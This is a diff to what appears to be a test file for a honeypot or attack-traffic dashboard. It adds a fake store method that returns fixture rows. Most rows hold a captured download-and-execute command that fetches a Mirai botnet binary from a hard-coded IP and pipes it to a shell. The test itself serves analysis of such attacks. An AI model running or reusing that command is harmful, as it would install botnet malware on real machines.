@@ -142,6 +142,32 @@ class _FakeAggregateStore:
             'GET /normal HTTP/1.1',
         ]
 
+    def fetch_interesting_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
+        # The dashboard now pulls payloads via fetch_interesting_raws; mirror the
+        # fetch_request_raws rows as dicts so _build_payload's payload panel works.
+        self.since_seen = since
+        self.sinces_seen.append(since)
+        return [
+            {
+                'raw': 'wget http://91.92.40.118/mirai -O - | sh',
+                'classification': 'unknown',
+                'detected_id': None,
+                'request_path': '/',
+                'request_command': 'GET',
+                'login': '',
+            }
+            for _ in range(52)
+        ] + [
+            {
+                'raw': 'GET /normal HTTP/1.1',
+                'classification': 'unknown',
+                'detected_id': None,
+                'request_path': '/normal',
+                'request_command': 'GET',
+                'login': '',
+            },
+        ]
+
     def volume_series(self, since=None, bucket='hour', port=None):  # noqa: ANN001, ANN002
         return []
 
